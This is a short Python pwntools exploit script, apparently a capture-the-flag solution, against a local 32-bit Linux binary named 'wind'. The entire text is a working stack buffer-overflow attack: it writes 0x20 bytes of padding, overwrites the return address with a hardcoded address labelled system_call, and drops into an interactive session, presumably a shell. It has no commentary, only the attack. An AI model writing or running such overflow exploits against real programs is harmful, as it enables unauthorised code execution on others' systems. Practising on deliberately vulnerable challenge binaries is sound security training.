from pwn import *

context(arch='i386', os='linux')

target = "./wind"
p = process(target)

system_call = 0x080487f9

print p.recv()

payload = "A" * 0x20
payload += p32(system_call)

p.send(payload)
p.interactive()
